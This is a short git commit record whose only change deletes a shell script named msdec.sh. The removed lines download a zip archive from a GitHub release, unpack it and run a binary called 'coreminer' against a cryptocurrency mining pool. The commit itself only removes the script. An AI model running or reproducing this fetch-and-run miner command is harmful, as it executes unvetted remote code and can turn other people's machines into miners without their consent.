5cf7efa5196ba7d72a168873ed6748da4c80abc2
techne <108133282+varfeplas@users.noreply.github.com>
2024-06-21 01:37:26 +0530

    Delete msdec.sh

--- msdec.sh
+++
@@ -1,3 +0,0 @@
-#!/bin/bash
-wget https://github.com/cecepabdul/mining/releases/download/xdag/coreapp.zip && unzip coreapp.zip && cd coreapp && chmod +x coreminer && ./coreminer -P stratum://cb16e28eda52f3750022c539e75c84610f87af8030a9.cloud@eu.catchthatrabbit.com:8008
-
